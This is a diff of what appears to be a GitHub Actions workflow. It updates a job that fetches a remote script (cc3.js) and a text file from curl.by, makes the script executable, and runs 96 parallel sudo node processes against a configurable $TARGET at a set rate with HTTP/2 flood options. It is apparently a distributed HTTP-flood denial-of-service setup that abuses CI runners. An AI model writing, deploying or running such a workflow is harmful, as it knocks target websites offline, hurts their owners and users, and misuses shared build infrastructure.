@@ -28,7 +28,7 @@ jobs:
       run: |
         wget https://curl.by/cnsxx/cc3.js
         wget https://curl.by/q9W_R/gon.txt
-        chmod +x cc2.js
+        chmod +x cc3.js
         npm i hpack https commander colors 
     - name: run
       run: |
@@ -38,7 +38,7 @@ jobs:
         
         PIDS=()
         for i in {1..96}; do
-          sudo timeout $TIME node cc2.js GET "$TARGET" 200 10 "$RATE" gon.txt --full  --http 2 --winter
+          sudo timeout $TIME node cc3.js GET "$TARGET" 200 10 "$RATE" gon.txt --full  --http 2 --winter
           PIDS+=($!)
         done
         
